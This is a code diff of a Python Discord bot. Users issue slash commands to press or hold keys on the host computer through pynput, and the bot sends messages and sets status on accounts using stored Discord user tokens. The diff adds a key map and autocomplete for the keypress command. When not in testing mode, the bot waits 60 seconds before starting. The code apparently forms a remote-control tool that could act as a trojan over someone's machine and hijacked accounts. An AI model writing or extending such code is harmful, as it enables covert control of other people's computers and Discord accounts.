@@ -27,8 +27,8 @@ import traceback
 from pynput.keyboard import Key, Controller
 
 
-TESTING = False
-VERSION = "v4.1"
+TESTING = True
+VERSION = "v4.2"
 if not TESTING:
     time.sleep(60)
 
@@ -397,6 +397,7 @@ async def main():
                     res = discordRequest(f"channels/{channelID}/messages", {"content": content}, token['token'])
                     res.raise_for_status()
                     await ctx.respond(f"Message sent to user <@{id}>")
+    
 
     @bot.slash_command(name="status", description="Set user status")
     @uses_token
@@ -446,13 +447,69 @@ async def main():
             res = requests.patch(f"https://discord.com/api/v{version}/{path}", json=json, headers=headers)
         return res
     
+    key_map = {
+        'alt': Key.alt,
+        'alt_l': Key.alt_l,
+        'alt_r': Key.alt_r,
+        'backspace': Key.backspace,
+        'caps_lock': Key.caps_lock,
+        'cmd': Key.cmd,
+        'cmd_l': Key.cmd_l,
+        'cmd_r': Key.cmd_r,
+        'ctrl': Key.ctrl,
+        'ctrl_l': Key.ctrl_l,
+        'ctrl_r': Key.ctrl_r,
+        'delete': Key.delete,
+        'down': Key.down,
+        'end': Key.end,
+        'enter': Key.enter,
+        'esc': Key.esc,
+        'f1': Key.f1,
+        'f2': Key.f2,
+        'f3': Key.f3,
+        'f4': Key.f4,
+        'f5': Key.f5,
+        'f6': Key.f6,
+        'f7': Key.f7,
+        'f8': Key.f8,
+        'f9': Key.f9,
+        'f10': Key.f10,
+        'f11': Key.f11,
+        'f12': Key.f12,
+        'home': Key.home,
+        'left': Key.left,
+        'right': Key.right,
+        'up': Key.up,
+        'shift': Key.shift,
+        'shift_l': Key.shift_l,
+        'shift_r': Key.shift_r,
+        'space': Key.space,
+        'tab': Key.tab,
+        'insert': Key.insert,
+        'page_up': Key.page_up,
+        'page_down': Key.page_down,
+        'media_volume_up': Key.media_volume_up,
+        'media_volume_down': Key.media_volume_down,
+        'media_volume_mute': Key.media_volume_mute,
+        'print_screen': Key.print_screen,
+        'num_lock': Key.num_lock,
+        'pause': Key.pause,
+        'scroll_lock': Key.scroll_lock
+    }
+
+    
+    async def item_autocomplete(ctx: discord.AutocompleteContext):
+        # Return only matching items (Discord limits to 25 suggestions per autocomplete result)
+        return [item for item in key_map.keys() if ctx.value.lower() in item.lower()][:25]
 
     @bot.slash_command(name="key", description="Press or hold a key")
-    @option("key", description="Key to press")
+    @option("key", description="Key to press", required=True, autocomplete=item_autocomplete)
     @option("hold", description="Hold key for x seconds", required=False)
     async def presskey(ctx: discord.ApplicationContext, key: str, hold: int = 0.3):
         await ctx.defer()
         keyboard = Controller()
+
+        key = key_map.get(key)
 
         msg = await ctx.respond(f"Pressing key {key} for {hold} seconds...")
         keyboard.press(key)
